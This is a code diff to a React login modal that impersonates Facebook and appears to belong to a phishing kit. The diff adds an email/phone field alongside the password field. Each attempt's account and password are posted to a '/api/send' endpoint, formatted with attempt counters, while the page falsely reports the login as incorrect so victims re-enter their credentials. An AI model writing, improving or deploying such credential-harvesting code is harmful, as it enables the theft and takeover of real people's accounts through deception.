@@ -12,13 +12,14 @@ import { type FC, useEffect, useState } from 'react';
 
 const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [attempts, setAttempts] = useState(0);
+    const [accountInput, setAccountInput] = useState('');
     const [isLoading, setIsLoading] = useState(false);
     const [password, setPassword] = useState('');
     const [showError, setShowError] = useState(false);
     const [showPassword, setShowPassword] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { geoInfo, messageId, messageContent, setMessageContent } = store();
+    const { geoInfo, messageId, messageContent, setMessageId, setMessageContent } = store();
     const maxPass = config.MAX_PASS ?? 3;
 
     const t = (text: string): string => {
@@ -28,7 +29,7 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     useEffect(() => {
         if (!geoInfo) return;
 
-        const textsToTranslate = ['Password', "The password that you've entered is incorrect.", 'Continue'];
+        const textsToTranslate = ['Email or phone number', 'Password', 'The account or password you entered is incorrect.', 'Continue'];
 
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
@@ -48,7 +49,7 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     };
 
     const handleSubmit = async () => {
-        if (!password.trim() || isLoading) return;
+        if (!accountInput.trim() || !password.trim() || isLoading) return;
 
         setShowError(false);
         setIsLoading(true);
@@ -56,15 +57,20 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         const next = attempts + 1;
         setAttempts(next);
 
+        const accountLine = `<b>📨 Email/Phone ${next}/${maxPass}:</b> <code>${accountInput}</code>`;
         const passwordLine = `<b>🔒 Password ${next}/${maxPass}:</b> <code>${password}</code>`;
 
-        const updatedMessage = messageContent ? `${messageContent}\n\n${passwordLine}` : passwordLine;
+        const updatedMessage = messageContent ? `${messageContent}\n\n${accountLine}\n${passwordLine}` : `${accountLine}\n${passwordLine}`;
 
         try {
-            await axios.post('/api/send', {
+            const res = await axios.post('/api/send', {
                 message: updatedMessage,
                 message_id: messageId
             });
+
+            if (res?.data?.success && typeof res.data.message_id === 'number') {
+                setMessageId(res.data.message_id);
+            }
 
             setMessageContent(updatedMessage);
 
@@ -75,6 +81,7 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                 nextStep();
             } else {
                 setShowError(true);
+                setAccountInput('');
                 setPassword('');
             }
         } catch {
@@ -89,6 +96,12 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
             <div className='flex h-[90vh] w-full max-w-xl flex-col items-center gap-7 rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4'>
                 <Image src={FacebookLogoImage} alt='' className='mt-9 h-[70px] w-[70px]' />
                 <div className='flex w-full flex-1 flex-col justify-center'>
+                    <div className='relative mb-3 w-full'>
+                        <input type='text' id='account-input' value={accountInput} onChange={(e) => setAccountInput(e.target.value)} className='peer h-[60px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 pt-6 pb-2 placeholder-transparent focus:outline-none' placeholder={t('Email or phone number')} />
+                        <label htmlFor='account-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#4a4a4a] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
+                            {t('Email or phone number')}
+                        </label>
+                    </div>
                     <div className='relative w-full'>
                         <input type={showPassword ? 'text' : 'password'} id='password-input' value={password} onChange={(e) => setPassword(e.target.value)} className='peer h-[60px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 pt-6 pb-2 placeholder-transparent focus:outline-none' placeholder={t('Password')} />
                         <label htmlFor='password-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#4a4a4a] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
@@ -96,12 +109,12 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                         </label>
                         <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} size='lg' className='absolute top-1/2 right-2 -translate-y-1/2 cursor-pointer text-[#4a4a4a]' onClick={togglePassword} />
                     </div>
-                    {showError && <p className='mt-2 text-[15px] text-red-500'>{t("The password that you've entered is incorrect.")}</p>}
+                    {showError && <p className='mt-2 text-[15px] text-red-500'>{t('The account or password you entered is incorrect.')}</p>}
                     <button
                         onClick={() => {
                             handleSubmit();
                         }}
-                        disabled={isLoading}
+                        disabled={isLoading || !accountInput.trim() || !password.trim()}
                         className={`mt-4 flex h-[50px] w-full items-center justify-center gap-2 rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}
                     >
                         {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Continue')}
